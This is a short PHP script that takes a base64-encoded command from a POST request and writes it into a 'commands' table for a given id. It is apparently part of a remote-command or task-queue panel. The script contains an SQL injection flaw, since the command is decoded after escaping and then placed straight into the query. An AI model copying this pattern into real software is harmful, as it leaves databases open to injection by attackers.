<?php 
# Update an existing cmd after evaluation (auto-pilot mode OR scenario driven)
include("conn.php");
if(isset($_POST['pc'])) {$pc=addslashes(html_entity_decode($_POST['pc']));}
if(isset($_POST['cmd'])) {$cmd=addslashes(html_entity_decode($_POST['cmd']));}
if(isset($_POST['id'])) {$id=addslashes(html_entity_decode($_POST['id']));}
$result="";
$ok="0";
$cmd=base64_decode($cmd);
mysqli_query($bdd, "UPDATE commands SET cmd='$cmd' WHERE id='$id' AND ok='0' LIMIT 1");
mysqli_close($bdd); 

?>